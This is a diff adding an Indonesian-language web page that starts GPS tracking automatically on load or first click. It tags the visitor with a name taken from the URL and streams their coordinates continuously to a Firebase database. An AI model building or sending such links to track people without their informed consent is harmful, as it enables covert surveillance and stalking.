@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sistem Pelacak Lokasi Otomatis</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-slate-900 flex items-center justify-center min-h-screen p-4">
+
+  <div class="bg-slate-800 p-8 rounded-xl shadow-2xl w-full max-w-sm text-center border border-slate-700">
+    <div class="animate-pulse flex justify-center mb-4">
+      <div class="h-3 w-3 bg-red-500 rounded-full"></div>
+    </div>
+    <h1 class="text-xl font-bold text-white mb-2">Menggandeng Lokasi...</h1>
+    <p id="namaTampil" class="text-sm text-slate-400 mb-6">Menginisialisasi perangkat</p>
+
+    <div id="status" class="mt-4 text-xs font-mono text-emerald-400 bg-slate-950 p-3 rounded-lg border border-slate-700 h-24 flex items-center justify-center text-center">
+      Menghubungkan ke satelit GPS...
+    </div>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.11.0/firebase-app.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.11.0/firebase-firestore.js";
+
+    // PASTE FIREBASE CONFIG ANDA DI SINI
+    const firebaseConfig = {
+      apiKey: "API_KEY_ANDA",
+      authDomain: "PROJECT_ID.firebaseapp.com",
+      projectId: "PROJECT_ID",
+      storageBucket: "PROJECT_ID.appspot.com",
+      messagingSenderId: "SENDER_ID",
+      appId: "APP_ID"
+    };
+
+    // Inisialisasi Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    // 1. Ambil Nama Otomatis dari URL Parameter (Contoh: web.com/?nama=Rafa)
+    const urlParams = new URLSearchParams(window.location.search);
+    const namaUser = urlParams.get('nama') || "Perangkat_Anonim";
+    
+    document.getElementById('namaTampil').innerText = `Perangkat: ${namaUser}`;
+
+    // 2. Jalankan Fungsi Pelacakan Otomatis Saat Halaman Selesai Dimuat
+    window.onload = function() {
+      mulaiPelacakanOtomatis();
+    };
+
+    // Alternatif: Jika browser memblokir auto-run, klik di mana saja di layar akan memicu ini
+    document.body.addEventListener('click', () => {
+      mulaiPelacakanOtomatis();
+    }, { once: true }); // 'once: true' memastikan fungsi hanya terpicu sekali saat klik pertama
+
+    function mulaiPelacakanOtomatis() {
+      if (!navigator.geolocation) {
+        document.getElementById('status').innerText = "Error: Browser tidak mendukung Geolocation.";
+        return;
+      }
+
+      navigator.geolocation.watchPosition(
+        function(position) {
+          const lat = position.coords.latitude;
+          const lng = position.coords.longitude;
+          kirimKeFirebase(namaUser, lat, lng);
+        },
+        function(error) {
+          document.getElementById('status').innerText = "Gagal Akses GPS.\nPastikan Izin Lokasi di HP Aktif.";
+        },
+        { 
+          enableHighAccuracy: true, // Akurasi tinggi menggunakan GPS HP
+          maximumAge: 0,            // Selalu ambil lokasi terbaru, bukan cache
+          timeout: 10000 
+        }
+      );
+    }
+
+    async function kirimKeFirebase(nama, lat, lng) {
+      document.getElementById('status').innerText = `Koordinat Terdeteksi:\nLat: ${lat.toFixed(6)}\nLng: ${lng.toFixed(6)}\n\nSinkronisasi database...`;
+      
+      try {
+        await addDoc(collection(db, "riwayat_lokasi"), {
+          nama: nama,
+          latitude: lat,
+          longitude: lng,
+          waktu_pencatatan: serverTimestamp()
+        });
+        document.getElementById('status').innerText = `Koordinat Terdeteksi:\nLat: ${lat.toFixed(6)}\nLng: ${lng.toFixed(6)}\n\nStatus: Terupdate ✅`;
+      } catch (e) {
+        console.error("Error: ", e);
+        document.getElementById('status').innerText = "Gagal mengirim data ke Firebase.";
+      }
+    }
+  </script>
+</body>
+</html>
